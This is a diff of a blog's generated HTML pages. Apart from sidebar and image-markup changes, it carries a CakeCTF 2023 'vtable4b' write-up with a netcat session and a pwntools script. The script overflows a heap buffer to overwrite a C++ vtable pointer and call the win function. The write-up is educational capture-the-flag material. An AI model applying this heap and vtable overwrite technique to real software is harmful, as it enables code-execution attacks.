@@ -217,11 +217,11 @@
   </div>
   <div class="sidebar-state-category">
     <div>Categories</div>
-    <div class="sidebar-state-number">4</div>
+    <div class="sidebar-state-number">0</div>
   </div>
   <div class="sidebar-state-tag">
     <div>Tags</div>
-    <div class="sidebar-state-number">0</div>
+    <div class="sidebar-state-number">16</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -333,12 +333,12 @@ My arms were almost broken by brute forcing through this…</li>
 <p>First,I try to <code>nc</code> it.You can look like that.If you can call the function <code>win</code>,you will get flag.  </p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">naup96321@DESKTOP-T2ED0OK:/mnt/c/Windows/system32$ nc vtable4b.2023.cakectf.com 9000</span><br><span class="line">Today, let&#x27;s learn how to exploit C++ vtable!</span><br><span class="line">You&#x27;re going to abuse the following C++ class:</span><br><span class="line"></span><br><span class="line">  class Cowsay &#123;</span><br><span class="line">  public:</span><br><span class="line">    Cowsay(char *message) : message_(message) &#123;&#125;</span><br><span class="line">    char*&amp; message() &#123; return message_; &#125;</span><br><span class="line">    virtual void dialogue();</span><br><span class="line"></span><br><span class="line">  private:</span><br><span class="line">    char *message_;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">An instance of this class is allocated in the heap:</span><br><span class="line"></span><br><span class="line">  Cowsay *cowsay = new Cowsay(new char[0x18]());</span><br><span class="line"></span><br><span class="line">You can</span><br><span class="line"> 1. Call `dialogue` method:</span><br><span class="line">  cowsay-&gt;dialogue();</span><br><span class="line"></span><br><span class="line"> 2. Set `message`:</span><br><span class="line">  std::cin &gt;&gt; cowsay-&gt;message();</span><br><span class="line"></span><br><span class="line">Last but not least, here is the address of `win` function which you should call to get the flag:</span><br><span class="line">  &lt;win&gt; = 0x55a3e818c61a</span><br><span class="line"></span><br><span class="line">1. Use cowsay</span><br><span class="line">2. Change message</span><br><span class="line">3. Display heap</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
 <ul>
-<li><p>If you enter the number <code>1</code>.It is a cow which can say something.<br><div class="img-item" data-src="https://hackmd.io/_uploads/BJG0agRQp.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BJG0agRQp.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<li><p>If you enter the number <code>1</code>.It is a cow which can say something.<br><img src="https://hackmd.io/_uploads/BJG0agRQp.png" alt="image"></p>
 </li>
 <li><p>If you enter the number <code>2</code>.You can enter somthing words and sentence, and then it can change the text which spoken by the cow and heap data in third position  </p>
-<p><div class="img-item" data-src="https://hackmd.io/_uploads/Bk3QCeAmp.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/Bk3QCeAmp.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p><img src="https://hackmd.io/_uploads/Bk3QCeAmp.png" alt="image"></p>
 </li>
-<li><p>If you enter the number <code>3</code>.Yoy can look a vtable. It is a structure in C++.<br><div class="img-item" data-src="https://hackmd.io/_uploads/HJHXTgAQT.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HJHXTgAQT.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<li><p>If you enter the number <code>3</code>.Yoy can look a vtable. It is a structure in C++.<br><img src="https://hackmd.io/_uploads/HJHXTgAQT.png" alt="image"></p>
 </li>
 </ul>
 <p>I think it can use overflow the <code>heap</code> to solve it.<br>In each round, it has differnce addresses. So first of all, the address of function <code>win</code> and the address of <code>heap</code> must be re-received in each round.<br>Next, we need to change its pointer so that it can control the heap first, and then call the function of win by entering 1.  </p>
@@ -346,7 +346,7 @@ My arms were almost broken by brute forcing through this…</li>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(b&#x27;A&#x27;*8)+p64(int(addr,16))+(b&quot;A&quot;*8)*2+p64(int(t_address,16))</span><br></pre></td></tr></table></figure>
 <p>and then you enter 1,it will call:  </p>
 <p><strong>0x5634714d2ed0</strong>-&gt;<strong>0x5634714d2eb8</strong>-&gt;<strong>function win</strong></p>
-<p><div class="img-item" data-src="https://hackmd.io/_uploads/BkJcw-0Qp.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BkJcw-0Qp.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p><img src="https://hackmd.io/_uploads/BkJcw-0Qp.png" alt="image"></p>
 <p><strong>Solve Script</strong>  </p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&quot;vtable4b.2023.cakectf.com&quot;</span>,<span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uns_addr = r.recvuntil(<span class="string">b&quot;\n\n1.&quot;</span>)</span><br><span class="line">addr = uns_addr.split(<span class="string">b&quot;\n\n1&quot;</span>)[<span class="number">0</span>][-<span class="number">14</span>:]</span><br><span class="line"><span class="built_in">print</span>(addr)</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.send(<span class="string">b&quot;3\n&quot;</span>)</span><br><span class="line">heap_data = r.recvuntil(<span class="string">b&quot;\n\n1.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(heap_data)</span><br><span class="line">t_address = heap_data.split(<span class="string">b&quot;\n&quot;</span>)[<span class="number">9</span>][:<span class="number">14</span>]</span><br><span class="line"><span class="built_in">print</span>(t_address)</span><br><span class="line"></span><br><span class="line">r.recv(timeout=<span class="number">1</span>)</span><br><span class="line">r.send(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;: &quot;</span>,timeout=<span class="number">1</span>)</span><br><span class="line">r.send((<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>)+p64(<span class="built_in">int</span>(addr,<span class="number">16</span>))+(<span class="string">b&quot;A&quot;</span>*<span class="number">8</span>)*<span class="number">2</span>+p64(<span class="built_in">int</span>(t_address,<span class="number">16</span>)))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;1111&quot;</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
@@ -372,14 +372,14 @@ My arms were almost broken by brute forcing through this…</li>
         
           
           
-            <img data-src="/images/banner.webp" data-sizes="auto" alt="CGGC 網路守護者挑戰賽 Qual Writeup" class="lazyload">
+            <img data-src="/images/banner.webp" data-sizes="auto" alt="CGGC 2024 Qual Writeup" class="lazyload">
           
         
         <a href="/2024/02/29/CGGC-WP/"></a>
         <div class="article-nav-caption">Newer</div>
         <h3 class="article-nav-title">
           
-            CGGC 網路守護者挑戰賽 Qual Writeup
+            CGGC 2024 Qual Writeup
           
         </h3>
       </div>
@@ -436,7 +436,7 @@ My arms were almost broken by brute forcing through this…</li>
     
       <div>
         <span class="icon-brush"></span>
-        149.8k
+        149.6k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
         13:10
@@ -488,11 +488,11 @@ My arms were almost broken by brute forcing through this…</li>
   </div>
   <div class="sidebar-state-category">
     <div>Categories</div>
-    <div class="sidebar-state-number">4</div>
+    <div class="sidebar-state-number">0</div>
   </div>
   <div class="sidebar-state-tag">
     <div>Tags</div>
-    <div class="sidebar-state-number">0</div>
+    <div class="sidebar-state-number">16</div>
   </div>
 </div>
 <div class="sidebar-social">
